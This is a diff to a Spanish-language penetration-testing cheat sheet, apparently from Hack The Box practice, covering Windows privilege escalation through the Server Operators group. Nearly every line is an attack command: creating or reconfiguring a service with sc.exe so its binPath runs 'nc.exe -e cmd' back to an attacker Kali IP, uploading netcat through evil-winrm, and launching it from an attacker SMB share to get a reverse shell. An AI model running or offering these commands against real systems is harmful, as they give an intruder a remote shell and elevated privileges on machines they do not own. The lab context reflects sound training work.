@@ -1,10 +1,11 @@
-// SERVICIOS LISTAR MODIFICAR ARRANCAR/DETENER SERVICIOS ($(net user userNameHere)  *Server Operators)
+
+### SERVICIOS LISTAR MODIFICAR ARRANCAR/DETENER SERVICIOS ($(net user userNameHere)  *Server Operators)
 
   ::: services          
 
   ::: sc.exe create nameServiceHere binPath="C:\Users\userHere\Desktop\nc.exe -e cmd kaliIpHere 443"
 
-   !! si no deja crear servicios queda tratar de configurar alguno para detener y arrancar con el binPath modificado <3
+		 !! si no deja crear servicios queda tratar de configurar alguno para detener y arrancar con el binPath modificado <3
   ::: sc.exe config nameServiceHere binPath="C:\Users\userHere\Desktop\nc.exe -e cmd kaliIpHere 443"
 
 
@@ -13,12 +14,9 @@
   ::: sc.exe start nameServiceHere
 
 
-
-
-// SUBIR ARCHIVO AL TARGED EVIL-WINRM
+### SUBIR ARCHIVO AL TARGED EVIL-WINRM
     !! asegurate de tener permiso de escritura en la carpeta actual,  cd %UserProfile%
   ::: upload /home/mangoPc/Desktop/HTB/return/nc.exe
-
 
 
 ::: cmd /c \\ipKali\smbFolder\nc.exe -e cmd ipKali 443
